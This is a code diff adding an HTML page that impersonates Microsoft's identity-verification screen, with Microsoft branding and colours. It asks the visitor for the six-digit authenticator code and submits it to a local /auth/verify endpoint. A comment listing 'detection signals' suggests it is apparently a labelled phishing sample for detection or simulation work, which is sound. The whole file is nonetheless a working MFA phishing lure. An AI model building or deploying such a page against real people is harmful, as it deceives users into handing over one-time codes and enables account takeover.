@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft - Verify your identity</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f3f2f1; margin: 0; padding: 20px; }
+        .ms-container { max-width: 440px; margin: 50px auto; background: white; border-radius: 2px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); padding: 48px 44px; }
+        .ms-logo { text-align: center; margin-bottom: 30px; font-size: 24px; font-weight: 600; }
+        .ms-logo-text { color: #0078d4; }
+        .ms-title { color: #323130; font-size: 24px; margin-bottom: 12px; font-weight: 600; }
+        .ms-text { color: #605e5c; line-height: 1.7; margin-bottom: 25px; }
+        .ms-form-group { margin-bottom: 20px; }
+        .ms-label { display: block; color: #323130; margin-bottom: 8px; font-weight: 600; font-size: 15px; }
+        .ms-input { width: 100%; padding: 12px; border: 1px solid #8a8886; border-radius: 2px; font-size: 15px; box-sizing: border-box; }
+        .ms-input:focus { border-color: #0078d4; outline: none; }
+        .ms-button { width: 100%; padding: 13px; background: #0078d4; color: white; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .ms-button:hover { background: #106ebe; }
+    </style>
+</head>
+<body>
+    <!-- Detection Signals: Tech domain: microsoft, azure -->
+    <div class="ms-container">
+        <div class="ms-logo"><span class="ms-logo-text">Microsoft</span></div>
+        <h1 class="ms-title">Verify your identity</h1>
+        <p class="ms-text">Enter the code we sent to your authenticator app.</p>
+        <form id="verifyForm" action="/auth/verify" method="POST">
+            <div class="ms-form-group">
+                <label for="otpCode" class="ms-label">Code</label>
+                <input type="tel" id="otpCode" name="otp_code" class="ms-input" placeholder="000000" maxlength="6" pattern="[0-9]{6}" inputmode="numeric" autocomplete="one-time-code" required />
+            </div>
+            <button type="submit" class="ms-button">Verify</button>
+        </form>
+    </div>
+</body>
+</html>
